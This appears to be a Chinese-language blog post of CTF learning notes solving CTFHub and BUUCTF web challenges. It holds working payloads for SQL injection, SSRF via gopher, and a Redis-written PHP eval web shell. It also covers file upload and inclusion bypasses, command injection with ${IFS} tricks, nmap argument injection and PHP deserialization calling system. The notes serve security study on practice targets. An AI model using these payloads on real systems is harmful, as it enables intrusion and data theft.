---
layout: default
title: CTF Learning Notes 2
categories:
- Security
tags:
- Security
---
//Description: 

//Create Date: 2025-08-13 09:04:20

//Author: channy

[toc]

# 参考书籍 
[CTF实战：技术、解题与进阶]

题目在 [CTFHub](https://www.ctfhub.com/#/index)　和　[BUUCTF](https://buuoj.cn/challenges)

# 使用到的工具或网址
[DNS重绑定](https://lock.cmpxchg8b.com/rebinder.html)
[CEYE](http://ceye.io) 回显
# [SQL]
## 整数型注入
> union内部的每个select语句必须拥有相同数量的列。
```sql
-- 确认列数：order by / union

select * from xxx where id=-1 order by 3   --3列

select * from xxx where id=-1 union select 1,2,3   --3列
```
> 回显只能显示一条数据的情况时，可以通过group_concat()函数将多条数据组合成字符串并输出，或者通过limit函数选择输出第几条数据。  
> MySQL5.0以上的版本中，有一个名为information_schema的默认数据库，里面存放着所有数据库的信息，比如表名、列名、对应权限等
```sql
-1 union select 1,group_concat(schema_name) from information_schema.schemata
-- Data: information_schema,performance_schema,mysql,sqli
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'
-- Data: news,flag 
-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'
Data: flag 
-1 union select 1,flag from sqli.flag
-- Data: ctfhub{cccd760851d6d8b64d74a6ec} 
```
## 字符型注入
使用`--`注释不成功，换成`#`才好。。。
```sql
1' and 1=2 union select 1, group_concat(schema_name) from information_schema.schemata#
-- Data: information_schema,performance_schema,mysql,sqli
1' and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'#
-- Data: news,flag
1' and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'#
-- Data: flag
1' and 1=2 union select 1,flag from sqli.flag#
```
## 报错注入
```sql
1 or extractvalue(1, (select database()) )
-- 查询正确 
1 or extractvalue(1, concat(0x7e, (SELECT database()) ))
-- 查询错误: XPATH syntax error: '~sqli' 
1 or extractvalue(1, concat(0x7e, (select group_concat(schema_name) from information_schema.schemata) ))

1 or extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli') ))
-- 查询错误: XPATH syntax error: '~news,flag' 
1 or extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag')))
-- 查询错误: XPATH syntax error: '~flag' 
1 or extractvalue(1, concat(0x7e, (select flag from sqli.flag)))
-- 查询错误: XPATH syntax error: '~ctfhub{ededf8c215f60ebdbc61340b' 
1 or extractvalue(1, concat(0x7e, substr((select flag from sqli.flag), 32)))
-- 查询错误: XPATH syntax error: '~}' 
```
## Bool盲注
数据库名称、表名和列名 [a-zA-Z0-9_]
## 时间盲注
## [二次注入](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk)
```sh
file=php://filter/convert.base64-encode/resource=index.php
```
```py
import base64
s = base64.b64decode(s)
```
得到网页源码。
```
',`address`=(select(load_file("/flag.txt")))#
```
## [无列名注入](https://buuoj.cn/challenges#[SWPU2019]Web1)
在“发布广告”中尝试注入然后查看显示的“广告名”和“内容”可以判断过滤掉了空格(%20)、注释`--`和`#`、`or`、`information_schema`等，改用`/**/`替代空格。先确定列数，可以使用`group by`
```sql
1'/**/group/**/by/**/3,'2
```
当到23时点击“广告详情”有报错信息，确认列数为22。
```sql
1'/**/union/**/select/**/1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
-- You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' limit 0,1' at line 1
1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&&'1'='1
-- 2,3列分别是广告名和广告内容
1'/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&&'1'='1
-- web1
1'union/**/select/**/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='web1'&&'1'='1
-- ads,users
-- 无列名注入，发现a={1,1,2,3}、b无意义，c有flag
1'union/**/select/**/1,(select/**/group_concat(c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&&'1'='1
```
## [堆叠注入](https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8)
`select`、`where`等都过虑掉了。
```sql
1';show databases;#
1';show tables;#
1'; show columns from `1919810931114514`;#
1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#
```
sql预编译 prepare xxx_name from xxx_sql_exec; execute xxx_name;
## [SQL注入与其它结合](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Fakebook)
```sql
view.php?no=-1%20union/**/select%201,2,3,4
```
fakebook -> users -> no,username,passwd,data -> O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:6:"1.html";} 

union了半天发现没什么有用信息

githacker扫描没发现问题，dirsearch扫描发现有robots.txt和flag.php，txt里面显示有user.php.bak，里面是源码。

```sql
view.php?no=-1%20union/**/select%201,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'

view.php?no=-1%20union/**/select%201,load_file(%27/var/www/html/flag.php%27),3,4#
```
# [XSS]

# [SSRF]
## [内网访问]
url=127.0.0.1/flag.php
## [伪协议]
url=file:///var/www/html/flag.php
结果不一定显示在页面上，也可能隐藏在response中。
## [端口扫描]
url=127.0.0.1:8000 ~ url=127.0.0.1:9000  
BurpSuite的Intruder端口遍历扫描爆破
## [Gopher协议]
```
gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253D34ae68383f7ec667fa74685d316cb34d
```
页面可以直接添加
```
<input type="submit" name="submit" >
``` 
gopher编码后，`%0D`->`%250D`,`:`->`%253A`,`%0A`->`%250A`...
## [redis协议]
```sh
config set dir /var/www/html/ 
config set dbfilename shell.php
set x <?php @eval($_POST['cmd']);?>
save

gopher%3A%2F%2F127.0.0.1%3A6379%2F_config%2520set%2520dir%2520%2Fvar%2Fwww%2Fhtml%2F%250D%250Aconfig%2520set%2520dbfilename%2520shell.php%250D%250Aset%2520x%2520%2522%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527cmd%2527%255D%2529%253B%253F%253E%2522%250D%250Asave%250D%250A
```
## [ByPass]
* url: HTTP的基本身份认证允许Web浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证，格式为http://user@domain。以@分割URL，前面为用户信息，后面才是真正的请求地址
* number: 127.0.0.1, localhost, 0, 0.0.0.0...
* 302跳转绕过
* DNS重绑定绕过
## [fastCGI]
```
127.0.0.1:9000
```
gopher
```
```

# [SSRF Deeper]
一些中间件的默认配置项就设定了一些可解析的格式，如.phtml、.phps、.pht、.php2、.php3、.php4、.php5等
## [文件上传]
文件绕过，.htaccess把目录和子目录下所有文件都当成php处理：
```
SetHandler application/x-httpd-php
```
00截断，
```
POST /?road=/var/www/html/upload/empty.php%00.gif HTTP/1.1
```
## [文件包含]
```
GET /?file=shell.txt&ctfhub=system("ls") HTTP/1.1
```
`ls`没有结果显示，flag应该没在`/var/www/html`路径下。使用AntSword连challenge-6fe846579e2d1d51.sandbox.ctfhub.com:10800/?file=shell.txt能连接成功，还可以这样连。。。
## [php://input]
get改post加`Content-Type: application/x-www-form-urlencoded`
```sh
POST /?file=php://input HTTP/1.1
Host: challenge-fe24f50a3307aa2a.sandbox.ctfhub.com:10800
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

<?php phpinfo(); ?>
```
post内容修改成`<?php system('ls'); ?>`等找到flag并显示`<?php system('cat /flag_9022'); ?>`
## [php://filter]
```
php://filter/read=convert.Base64-encode/resource=/flag
```
## [命令注入]
`cat`的替代`tail`,`head`等；空格的替代`${IFS}`,目录分隔符`/`的替代`${HOME:0:1}`等。

直接页面中输入`%0a`会被二次编码成`%250a`变成`/?ip=0%250als`没有输出。。。还是需要借助BurpSuite工具修改
```
/?ip=0%0atail${IFS}-n${IFS}100${IFS}fl*${HOME:0:1}fl*23570606726090.php
```
## [命令注入](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Nmap)
escapeshellarg()：将一个字符串安全地转义，以便将其作为单个参数传递给 shell 命令。

escapeshellcmd()：转义一条命令中所有可能危险的元字符。

`nmap` -iL 读取文件中的ip，-o 输出结果到文件
```
0' -iL /flag -o filename
```

访问filename'
## [serialize](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]phpweb)
```sh
<?php
class Test{
        var $p;
        var $func;
}
$a = new Test();
$a->func = "system";
$a->p = "find / -name \"*flag*\" 2>/dev/null";
echo serialize($a)
?>
```

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:33:"find / -name "*flag*" 2>/dev/null";s:4:"func";s:6:"system";}

func=file_get_contents&p=/tmp/flagoefiu4r93
```
## []()